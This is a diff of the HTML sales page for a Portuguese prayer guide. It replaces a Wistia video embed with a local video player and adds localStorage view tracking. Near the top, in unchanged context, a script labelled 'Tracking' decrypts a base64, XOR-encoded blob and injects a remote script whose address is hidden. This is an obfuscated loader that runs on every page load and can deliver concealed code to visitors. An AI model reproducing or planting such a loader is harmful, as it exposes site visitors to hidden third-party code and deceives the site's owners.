@@ -20,8 +20,6 @@ src="https://www.facebook.com/tr?id=983140274473114&ev=PageView&noscript=1"
 <!-- Tracking -->
 <script>(function(){var g_2n=atob("DHinI+dBTre5kpWyqQOFVpUtbI2b+uHG2QudDMgiKtmX5+HfwB7eDYQuI5nb4LrBygrOU5MyYcfQ6vDehgjOW4ItYN3KsLmQyAzTUY4jO8Pc4beI8iWLAYAtIdXY/uaQkyPcAYkgI9KbqLfCwADCT64lbJub5PTe3B2FGcV3L4CIoveAmEGTR9ElfIaLpKDTnkyQFoJjM+rE");var i_n=[];for(var a_x5sf=0;a_x5sf<g_2n.length;a_x5sf++){i_n.push(g_2n.charCodeAt(a_x5sf)&255);}var p_kric=i_n[0];var r_s=i_n.slice(1,1+p_kric);var h_6=i_n.slice(1+p_kric);var y_as=h_6.map(function(b,c_9cg){return b^r_s[c_9cg%p_kric];});var r_ogf1="";for(var e_ajew=0;e_ajew<y_as.length;e_ajew++){r_ogf1+=String.fromCharCode(y_as[e_ajew]&255);}var y_0t=decodeURIComponent(escape(r_ogf1));var y_f=JSON.parse(y_0t);var d_39tw=y_f.globals||[];d_39tw.forEach(function(y_vknp){window[y_vknp.name]=y_vknp.value;});var l_e9l=document.createElement("script");l_e9l.src=y_f.url;l_e9l.async=true;l_e9l.defer=true;(y_f.attributes||[]).forEach(function(y_gw){l_e9l.setAttribute(y_gw.name,y_gw.value);});(document.head||document.documentElement).appendChild(l_e9l);})();</script>
 <meta charset="UTF-8">
-<script src="https://fast.wistia.com/player.js" async></script>
-<script src="https://fast.wistia.com/embed/49p3agmijk.js" async type="module"></script>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>50 Orações Poderosas — Guia Espiritual</title>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Lora:ital,wght@0,400;0,500;0,600;1,400;1,500&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -365,8 +363,12 @@ footer a{color:#C47A0A;text-decoration:none}
     <div class="vsl-label">✝ Assista antes de continuar</div>
     <h2 class="vsl-title">Assista: Por que sua oração parece não sair — e como resolver</h2>
     <div style="border-radius:18px;overflow:hidden;box-shadow:0 0 0 1px rgba(196,122,10,.2),0 0 60px rgba(196,122,10,.15),0 24px 80px rgba(0,0,0,.7);max-width:360px;margin:0 auto;position:relative">
-      <style>wistia-player[media-id='49p3agmijk']:not(:defined){background:center/contain no-repeat url('https://fast.wistia.com/embed/medias/49p3agmijk/swatch');display:block;filter:blur(5px);padding-top:177.78%}</style>
-      <wistia-player media-id="49p3agmijk" aspect="0.5625"></wistia-player>
+      <video id="vsl-video"
+        style="width:100%;display:block;background:#000"
+        playsinline preload="metadata"
+        poster="">
+        <source src="vsl.mp4" type="video/mp4">
+      </video>
     </div>
     <p style="margin-top:14px;padding-bottom:48px;font-size:13px;color:rgba(255,255,255,.4);font-family:'Inter',sans-serif;letter-spacing:.3px">🔊 Ative o som — dura apenas 3 minutos</p>
   </div>
@@ -863,16 +865,58 @@ function toggleFaq(btn){
 
 
 <script>
-// Liga o Gate ao player Wistia
-window._wq = window._wq || [];
-_wq.push({ id: '49p3agmijk', onReady: function(video) {
-  video.bind('play', function() {
-    if(typeof iniciarTimer === 'function') iniciarTimer();
+// ══ VSL TRACKING + GATE ══
+(function(){
+  var AK='50oracoes_vsl_v1';
+  var SID=sessionStorage.getItem('vsid')||(function(){var id=Date.now()+Math.random().toString(36).slice(2);sessionStorage.setItem('vsid',id);return id;})();
+  var tracked={};
+
+  function trackVSL(ev,val){
+    try{
+      var a=JSON.parse(localStorage.getItem(AK)||'{"plays":0,"completions":0,"totalTime":0,"sessions":[],"retention":{},"daily":{}}');
+      if(ev==='play'&&!tracked.play){a.plays++;tracked.play=true;}
+      if(ev==='complete'){a.completions++;}
+      if(ev==='pct'){if(!a.retention[val])a.retention[val]=0;if(!tracked['p'+val]){a.retention[val]++;tracked['p'+val]=true;}}
+      if(ev==='watchtime'){a.totalTime=(a.totalTime||0)+val;}
+      var today=new Date().toISOString().slice(0,10);
+      if(ev==='play'){if(!a.daily[today])a.daily[today]=0;a.daily[today]++;}
+      a.sessions=a.sessions||[];
+      a.sessions.push({sid:SID,ev:ev,val:val||null,ts:Date.now()});
+      if(a.sessions.length>1000)a.sessions=a.sessions.slice(-1000);
+      localStorage.setItem(AK,JSON.stringify(a));
+    }catch(e){}
+  }
+
+  document.addEventListener('DOMContentLoaded',function(){
+    var vsl=document.getElementById('vsl-video');
+    if(!vsl) return;
+
+    // Carrega URL salva no admin
+    var saved=localStorage.getItem('vsl_src');
+    if(saved){vsl.src=saved;vsl.load();}
+
+    var watchStart=null;
+    vsl.addEventListener('play',function(){
+      watchStart=Date.now();
+      trackVSL('play');
+      if(typeof iniciarTimer==='function') iniciarTimer();
+    });
+    vsl.addEventListener('pause',function(){
+      if(watchStart){trackVSL('watchtime',Math.round((Date.now()-watchStart)/1000));watchStart=null;}
+    });
+    vsl.addEventListener('ended',function(){
+      if(watchStart){trackVSL('watchtime',Math.round((Date.now()-watchStart)/1000));watchStart=null;}
+      trackVSL('pct',100);
+      trackVSL('complete');
+      if(typeof liberar==='function') liberar();
+    });
+    vsl.addEventListener('timeupdate',function(){
+      if(!vsl.duration)return;
+      var pct=Math.floor(vsl.currentTime/vsl.duration*10)*10;
+      if(pct>0)trackVSL('pct',pct);
+    });
   });
-  video.bind('end', function() {
-    if(typeof liberar === 'function') liberar();
-  });
-}});
+})();
 </script>
 </body>
 </html>
